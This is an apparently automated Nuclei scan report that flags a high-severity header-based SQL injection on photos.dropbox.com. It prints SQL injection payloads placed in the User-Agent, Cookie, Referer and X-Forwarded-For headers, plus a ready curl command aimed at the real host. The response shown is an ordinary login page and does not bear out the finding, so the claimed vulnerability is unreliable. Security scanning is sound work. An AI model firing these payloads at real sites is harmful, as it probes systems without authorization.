### Request header based sqli (header-sqli) found on https://photos.dropbox.com

----
**Details**: **header-sqli** matched at https://photos.dropbox.com

**Protocol**: HTTP

**Full URL**: https://www.dropbox.com/login?cont=%2Fphotos

**Timestamp**: Sat Dec 9 14:39:50 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Request header based sqli |
| Authors | panch0r3d |
| Tags |  |
| Severity | high |

**Request**
```http
GET / HTTP/1.1
Host: photos.dropbox.com
User-Agent: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
Connection: close
Accept: */*
Accept-Language: en
Cookie: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
Referer: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
X-Forwarded-For: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Accept-Encoding: identity,gzip
Cache-Control: no-cache, no-store
Content-Security-Policy: base-uri 'self' ; child-src https://www.dropbox.com/static/serviceworker/ blob: ; connect-src https://* ws://127.0.0.1:*/ws wss://dsimports.dropbox.com/ ; default-src 'none' ; font-src https://* data: ; form-action 'self' https://www.dropbox.com/ https://dl-web.dropbox.com/ https://photos.dropbox.com/ https://paper.dropbox.com/ https://showcase.dropbox.com/ https://www.hellofax.com/ https://app.hellofax.com/ https://www.hellosign.com/ https://app.hellosign.com/ https://docsend.com/ https://www.docsend.com/ https://help.dropbox.com/ https://navi.dropbox.jp/ https://a.sprig.com/ https://selfguidedlearning.dropboxbusiness.com/ https://instructorledlearning.dropboxbusiness.com/ https://sales.dropboxbusiness.com/ https://accounts.google.com/ https://api.login.yahoo.com/ https://login.yahoo.com/ https://experience.dropbox.com/ https://pal-test.adyen.com https://2e83413d8036243b-Dropbox-pal-live.adyenpayments.com/ ; frame-src https://* carousel: dbapi-6: dbapi-7: dbapi-8: dropbox-client: itms-apps: itms-appss: ; img-src https://* data: blob: ; media-src https://* blob: ; object-src 'self' https://cfl.dropboxstatic.com/static/ https://www.dropboxstatic.com/static/ ; report-uri https://www.dropbox.com/csp_log?policy_name=metaserver-whitelist ; script-src 'unsafe-eval' https://www.dropbox.com/static/api/ https://www.dropbox.com/page_success/ https://cfl.dropboxstatic.com/static/ https://www.dropboxstatic.com/static/ https://accounts.google.com/gsi/client https://canny.io/sdk.js https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ 'unsafe-inline' ; style-src https://* 'unsafe-inline' 'unsafe-eval' ; worker-src https://www.dropbox.com/static/serviceworker/ https://www.dropbox.com/encrypted_folder_download/service_worker.js blob:
Content-Type: text/html; charset=utf-8
Date: Sat, 09 Dec 2023 14:39:50 GMT
Referrer-Policy: strict-origin-when-cross-origin
Server: envoy
Set-Cookie: __Host-logged-out-session=ChDzpBllCSJLugAsXc7ksx1tELb40asGGi5BSVlldEFBUFlSRjQ3U1ZoU1hITS1YNWlRbmdveW5sOThLMTFkdFRELS05YVJB; HttpOnly; Path=/; SameSite=None; Secure
Set-Cookie: locale=en; Domain=dropbox.com; expires=Thu, 07 Dec 2028 14:39:50 GMT; Path=/; SameSite=None; Secure
Strict-Transport-Security: max-age=31536000; includeSubDomains
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Dropbox-Request-Id: 6d947855f88144ebaa545b4631a44957
X-Dropbox-Response-Origin: far_remote
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Server-Response-Time: 259
X-Xss-Protection: 1; mode=block

<!DOCTYPE html><html class="media-desktop" lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://ogp.me/ns/fb#"><head><script nonce="0T9GRnTQ4wYJZgz7wrNe">
window._goch_ = {};
window.addEventListener('click', function(event) {
    'use strict';
    for (var elm = event.target; elm; elm = elm.parentElement) {
        if (elm.id &&
            window._goch_.hasOwnProperty(elm.id) &&
            window._goch_[elm.id].call(elm, event) === false) {
            event.preventDefault();
        }
    }
}, true);
window._csp_external_script_nonce = "j5Yq0P3P2l03puIys+9P"</script><meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible" /><link href="https://www.dropbox.com/login" rel="canonical" /><head><script nonce="0T9GRnTQ4wYJZgz7wrNe">
window._goch_ = {};
window.addEventListener('click', function(event) {
    'use strict';
    for (var elm = event.target; elm; elm = elm.parentElement) {
        if (elm.id &&
            window._goch_.hasOwnProperty(elm.id) &&
            window._goch_[elm.id].call(elm, event) === false) {
            event.preventDefault();
        }
    }
}, true);
window._csp_external_script_nonce = "j5Yq0P3P2l03puIys+9P"</script><link href="https://cfl.dropboxstatic.com" rel="preconnect" /><link href="https://cfl.dropboxstatic.com" rel="dns-prefetch" /><link href="https://consent.dropbox.com" rel="preconnect" /><link href="https://consent.dropbox.com" rel="dns-prefetch" /><link href="https://accounts.google.com" rel="preconnect" /><link href="https://accounts.google.com" rel="dns-prefetch" /><link href="https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico" rel="shortcut icon" /><link href="https://cfl.dropboxstatic.com/static/metaserver/static/css/main-vflT4Sd9a.css" rel="stylesheet" type="text/css" /><style type="text/css">@media only screen and (max-width: 980px){.unsub-page-content{padding:10px 30px} .unsub-page-content p{padding-top:10px} }</style><script type="text/javascript" nonce="0T9GRnTQ4wYJZgz7wrNe">window.ST=+new Date();</script><link href="https://cfl.dropboxstatic.com/static/metaserver/static/images/logo_catalog/dropbox_webclip_60_vis.png" rel="apple-touch-icon" /><link href="https://cfl.dropboxstatic.com/static/metaserver/static/images/logo_catalog/dropbox_webclip_76_vis.png" rel="apple-touch-icon" sizes="76x76" /><link href.... Truncated ....
```


**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' -H 'Referer: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' -H 'User-Agent: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' -H 'X-Forwarded-For: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' 'https://photos.dropbox.com/'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)